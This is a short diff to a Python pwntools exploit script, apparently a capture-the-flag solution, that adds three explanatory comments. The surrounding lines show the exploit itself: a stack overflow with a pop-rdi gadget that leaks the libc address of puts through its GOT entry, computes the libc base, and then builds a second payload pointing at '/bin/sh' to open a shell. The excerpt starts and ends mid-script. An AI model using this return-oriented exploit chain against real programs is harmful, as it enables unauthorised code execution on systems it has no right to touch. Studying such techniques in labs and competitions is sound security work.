@@ -137,6 +137,7 @@ pie_base = u64((b"\x0a" + pie_base).ljust(8, b'\x00')) - elf.sym['__libc_csu_ini
 print('PIE Base             :', hex(pie_base))
 print('Main                 :', hex(pie_base+elf.sym['main']))
 
+# Leak libc adr of puts
 payload1 = b"a" * 88
 payload1 += p64(pie_base+pop_rdi)
 payload1 += p64(pie_base+elf.got['puts'])
@@ -149,6 +150,7 @@ r.send(payload1)
 r.recvuntil(b'have been reset!')
 r.readline()
 
+# Read leak
 libc_leak = r.readline().strip()
 libc_base = u64(libc_leak.ljust(8, b'\x00')) - libc.sym['puts']
 
@@ -159,6 +161,7 @@ print('Libc Base            :', hex(libc_base))
 
 r.sendline(b"")
 
+# Pop a shell
 payload2 = b"a"*88
 payload2 += p64(pie_base+pop_rdi)
 payload2 += p64(libc_base + next(libc.search(b'/bin/sh')))
